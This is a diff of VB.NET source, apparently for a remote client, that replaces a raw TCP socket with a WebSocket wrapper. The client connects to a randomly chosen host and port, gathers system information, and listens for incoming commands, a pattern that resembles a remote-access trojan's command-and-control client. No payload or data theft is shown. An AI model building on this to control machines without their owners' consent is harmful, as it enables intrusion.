@@ -64,7 +64,7 @@ Namespace ClientApp
 
         Public Shared isConnected As Boolean = False
         Public Shared IsFrozen As Boolean = False
-        Public Shared S As Socket = Nothing
+        Public Shared S As WebSocketWrapper = Nothing
         Public Shared BufferLength As Long = Nothing
         Public Shared BufferLengthReceived As Boolean = False
         Public Shared Buffer() As Byte
@@ -170,19 +170,14 @@ Namespace ClientApp
         Public Shared Sub Connect()
 
             Try
-                Dim logMsg As String = "[CLIENT] Creating socket..."
+                Dim logMsg As String = "[CLIENT] Creating WebSocket..."
                 Console.WriteLine(logMsg)
                 Debug.WriteLine(logMsg)
                 LogToFile(logMsg)
                 
-                S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
-
                 BufferLength = 0
-                Buffer = New Byte(49999) {}  ' Initialize to proper 50KB size to receive protocol headers
+                Buffer = New Byte(49999) {}  ' Initialize to proper 50KB size
                 MS = New MemoryStream
-
-                S.ReceiveBufferSize = 50 * 1000
-                S.SendBufferSize = 50 * 1000
 
                 Dim targetHost As String = Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count))
                 Dim targetPort As Integer = Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count))
@@ -228,19 +223,21 @@ Namespace ClientApp
                 Debug.WriteLine(logMsg)
                 LogToFile(logMsg)
                 
-                logMsg = "[CLIENT] Connecting to " + resolvedIP + ":" + targetPort.ToString
+                logMsg = "[CLIENT] Connecting via WebSocket to " + targetHost + ":" + targetPort.ToString
                 Debug.WriteLine(logMsg)
                 LogToFile(logMsg)
                 
                 Try
-                    S.Connect(ipv4Addresses(0), targetPort)
+                    ' Create WebSocket wrapper
+                    S = New WebSocketWrapper(targetHost, targetPort)
+                    S.Connect()
                 Catch connEx As Exception
                     logMsg = "[CLIENT] Connection failed: " + connEx.Message + " (" + connEx.GetType.Name + ")"
                     LogToFile(logMsg)
                     Throw
                 End Try
                 
-                logMsg = "[CLIENT] Connected successfully! Local endpoint: " + S.LocalEndPoint.ToString
+                logMsg = "[CLIENT] WebSocket connected successfully!"
                 Debug.WriteLine(logMsg)
                 LogToFile(logMsg)
 
@@ -248,11 +245,11 @@ Namespace ClientApp
 
                 GatherSystemInfo()
 
-                logMsg = "[CLIENT] Starting async receive with buffer size: " + Buffer.Length.ToString
+                logMsg = "[CLIENT] Starting async receive..."
                 Debug.WriteLine(logMsg)
                 LogToFile(logMsg)
                 
-                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf ListenForCommands), Nothing)
+                S.BeginReceive(Buffer, 0, Buffer.Length, 0, New AsyncCallback(AddressOf ListenForCommands), Nothing)
 
                 Dim T As New TimerCallback(AddressOf Ping)
                 Tick = New Threading.Timer(T, Nothing, 15000, 30000)
